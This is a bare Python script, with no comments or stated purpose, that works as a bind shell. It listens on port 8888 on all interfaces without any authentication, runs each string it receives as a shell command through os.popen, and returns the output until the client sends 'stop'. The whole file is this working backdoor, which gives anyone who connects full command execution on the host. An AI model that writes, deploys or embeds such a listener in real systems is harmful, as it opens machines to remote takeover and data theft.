import socket
import os

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
server_socket.bind(('0.0.0.0', 8888))
server_socket.listen(1)

while True:
	client_socket, client_addr = server_socket.accept()
	request = client_socket.recv(1024)
	request = request.decode('utf-8')
	while request != "stop":
		response = os.popen(request).read()
		response = response.encode()
		client_socket.sendall(response)
		request = client_socket.recv(1024)

	client_socket.close()
